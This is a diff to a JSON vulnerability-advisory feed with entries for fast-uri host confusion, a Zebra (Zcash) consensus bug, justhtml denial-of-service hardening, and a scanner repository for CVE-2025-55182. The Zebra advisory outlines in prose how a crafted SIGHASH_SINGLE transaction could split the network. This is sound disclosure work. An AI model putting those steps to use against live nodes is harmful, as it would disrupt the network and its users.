+        "https://github.com/advisories/GHSA-v39h-62p7-jpjc",
+        "https://github.com/fastify/fast-uri/security/advisories/GHSA-v39h-62p7-jpjc",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-6322"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "fast-uri vulnerable to host confusion via percent-encoded authority delimiters"
+    },
+    {
+      "canonical_id": "GHSA-pvmv-cwg8-v6c8",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-354",
+        "CWE-573"
+      ],
+      "description": "# Consensus Divergence in V5 Transparent SIGHASH_SINGLE With No Corresponding Output\n\n## Summary\n\nZebra failed to enforce a ZIP-244 consensus rule for V5 transparent transactions: when an input is signed with `SIGHASH_SINGLE` and there is no transparent output at the same index as that input, validation must fail. Zebra instead asked the underlying sighash library to compute a digest, and that library produced a digest over an empty output set rather than failing. An attacker could craft a V5 transaction with more transparent inputs than outputs that Zebra accepts but `zcashd` rejects, creating a consensus split between Zebra and `zcashd` nodes.\n\nA previous fix ([`GHSA-cwfq-rfcr-8hmp`](https://github.com/ZcashFoundation/zebra/security/advisories/GHSA-cwfq-rfcr-8hmp)) addressed a closely related case in the same area of the code, but did not cover this specific one. \n\n## Severity\n\n**Critical** - This is a Consensus Vulnerability that could allow a malicious party to induce network partitioning, service disruption, and potential double-spend attacks against affected nodes.\n\nNote that the impact is currently alleviated by the fact that currently most miners run `zcashd`.\n\n## Affected Versions\n\nZebra 4.4.0.\n\n## Description\n\nVerification of transparent transactions inherits the Bitcoin Script verification code in C++. Since it is consensus-critical, this code is called from Zebra through a foreign function interface (FFI), with a Rust callback that computes the sighash for each input being verified.\n\nZIP-244 \u00a7S.2a marks two situations as consensus failure for V5 transparent signatures:\n\n1. The signed hash type is not one of the six canonical values; and\n2. The hash type is `SIGHASH_SINGLE` (alone or combined with `ANYONECANPAY`) and the input has no transparent output at the same index.\n\n`zcashd` enforces both rules: its `SignatureHash` raises an exception, and `CheckSig` catches it and fails the script. A previous fix (`GHSA-cwfq-rfcr-8hmp`) added the first rule to Zebra's V5 sighash callback. The second rule, however, was not added \u2014 Zebra's callback forwarded the request to `librustzcash`'s ZIP-244 implementation, which handles an out-of-range `SIGHASH_SINGLE` output index by hashing an empty output set rather than refusing to produce a digest. As a result, Zebra would compute a well-defined sighash for the missing-output case and accept any signature that verified against it.\n\nAn attacker could exploit this by:\n\n- Constructing a V5 transaction with two or more transparent inputs and fewer transparent outputs;\n- Signing an input whose index has no matching `vout` entry with `SIGHASH_SINGLE` (`0x03`) or `SIGHASH_SINGLE|ANYONECANPAY` (`0x83`), using the digest Zebra computes;\n- Broadcasting the transaction, or a block containing it, to the network.\n\nZebra would verify the transaction's transparent script and accept the transaction (and any block containing it), while `zcashd` would reject both, splitting Zebra nodes from the rest of the network.\n\n## Impact\n\n**Consensus Failure**\n\n- **Attack Vector:** Network.\n- **Effect:** Network partition/consensus split.\n- **Scope:** Any affected Zebra node.\n\n## Fixed Versions\n\nThis issue is fixed in Zebra 4.4.1.\n\n## Mitigation\n\nUsers should upgrade to Zebra 4.4.1 or later immediately.\n\nThere are no known workarounds for this issue. Immediate upgrade is the only way to ensure the node remains on the correct consensus path and is protected against malicious chain forks.\n\n## Credits\n\nZebra thanks @sangsoo-osec, @zmanian, and @fivelittleducks for finding and reporting the issue.",
+      "first_seen": "2026-05-08T19:41:44.939442+00:00",
+      "frameworks": [
+        "rust"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939442+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/ZcashFoundation/zebra/security/advisories/GHSA-pvmv-cwg8-v6c8",
+        "https://github.com/advisories/GHSA-pvmv-cwg8-v6c8"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "Zebra v4.4.0 still accepts V5 SIGHASH_SINGLE without a corresponding output"
+    },
+    {
+      "canonical_id": "GHSA-r8cj-3554-33mr",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-400",
+        "CWE-407",
+        "CWE-835"
+      ],
+      "description": "## Summary\n\n`justhtml` `1.18.0` fixes multiple low-severity denial-of-service hardening issues in CSS selector handling and linkification.\n\nThese issues are availability concerns. They do not allow script execution, data disclosure, or sanitizer bypass by themselves.\n\n## Affected versions\n\n- `justhtml` `< 1.18.0`\n\n## Fixed version\n\n- `justhtml` `1.18.0` released on May 4, 2026\n\n## Impact\n\n### CSS selector handling\n\nApplications that evaluate attacker-controlled selector strings, or that run selector-based transform pipelines over attacker-controlled documents, could consume disproportionate CPU or memory.\n\nThe affected selector patterns included oversized selectors, large selector lists, oversized compound selectors, long combinator chains, deeply nested functional pseudo-classes such as `:not(...)`, repeated attribute/class token matching over large values, repeated sibling or ancestor scans, repeated positional pseudo-class work, and `:contains(...)` over large descendant text.\n\nProgrammatically constructed malformed DOM graphs could also trigger non-terminating or duplicate traversal in some selector paths, including cyclic/shared child graphs, cyclic parent chains, and cyclic text traversal for `:contains(...)`.\n\n### Linkification\n\nAttacker-controlled text containing punctuation-heavy input or URL candidates ending in long runs of unmatched closing brackets could cause repeated rescanning and consume disproportionate CPU when linkification was enabled.\n\n## Default configuration\n\nOrdinary sanitization of parsed HTML with the default `JustHTML(..., sanitize=True)` configuration is not expected to expose untrusted users to selector injection, because selectors are normally supplied by application code.\n\nThe main risk areas are:\n\n- applications that accept selector strings from untrusted users and pass them to `query(...)`, `matches(...)`, or selector-based transforms\n- custom transform or sanitization pipelines that run selector matching over very large untrusted documents\n- applications that construct or mutate DOM trees programmatically from untrusted structure\n- applications that enable `Linkify(...)` over attacker-controlled text\n\n## Fixes in 1.18.0\n\n`1.18.0` adds generalized selector resource controls and removes several repeated-work hot paths:\n\n- shared selector limits for parse and match operations\n- structural caps for selector length, selector lists, compound selectors, complex selectors, and parse depth\n- match-operation and string-byte budgets\n- per-query matcher state for caches and cycle guards\n- precomputed or cached ancestor, sibling, positional, attribute-token, text-content, `:not(...)`, `:empty`, and `:nth-child(...)` work\n- consistent enforcement across public parsing, `query(...)`, tag-only query fast paths, transform selector compilation, and sanitization transform matching\n- linkification hardening for punctuation-heavy inputs and trailing bracket trimming\n\n## CWE mapping\n\n- CWE-400: Uncontrolled Resource Consumption\n- CWE-407: Inefficient Algorithmic Complexity\n- CWE-835: Loop with Unreachable Exit Condition\n\n## Recommended action\n\nUpgrade to `justhtml` `1.18.0`.\n\nIf users cannot upgrade immediately:\n\n- do not pass untrusted selector strings to `query(...)`, `matches(...)`, or selector-based transforms\n- restrict the size of untrusted documents before selector matching or linkification\n- avoid constructing programmatic DOM graphs from untrusted structure\n- avoid enabling `Linkify(...)` on very large attacker-controlled text\n\n## Credit\n\nDiscovered during an internal security review of `justhtml`.",
+      "first_seen": "2026-05-08T19:41:44.939486+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "sid",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939486+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/EmilStenstrom/justhtml/security/advisories/GHSA-r8cj-3554-33mr",
+        "https://github.com/advisories/GHSA-r8cj-3554-33mr"
+      ],
+      "severity": "low",
+      "source_count": 1,
+      "title": "justhtml introduces denial-of-service hardening"
+    },
+    {
+      "canonical_id": "CVE-2025-55182",
+      "composite_confidence": 0.55,
+      "cwe": [],
+      "description": "\ud83d\udee1\ufe0f Scan and assess vulnerabilities in Next.js/Waku with the CVE-2025-55182-Scanner, combining static and dynamic analysis for robust security.",
+      "first_seen": "2026-05-08T19:41:47.859442+00:00",
+      "frameworks": [
+        "appsec",
+        "cve-2025-55182",
+        "cybersecurity",
+        "cybersecurity-tools",
+        "devsecops",
+        "github-config",
+        "massive",
+        "nextjs",
+        "open-source",
+        "rce",
+        "react",
+        "react-server-components",
+        "react2shell",
+        "risk-analysis",
+        "security-scanner",
+        "software-security",
+        "tool-development"
+      ],
+      "key_kind": "cve",
+      "languages": [
+        "Python"
+      ],
+      "last_seen": "2026-05-08T19:41:47.859442+00:00",
+      "merged_sources": [
+        "github_trending"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/captain4554/CVE-2025-55182-Scanner"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "CVE-2025-55182-Scanner"
     }
   ],
-  "correlated_at": "2026-05-08T18:00:29.889984+00:00"
+  "correlated_at": "2026-05-08T19:41:49.531930+00:00"
 }
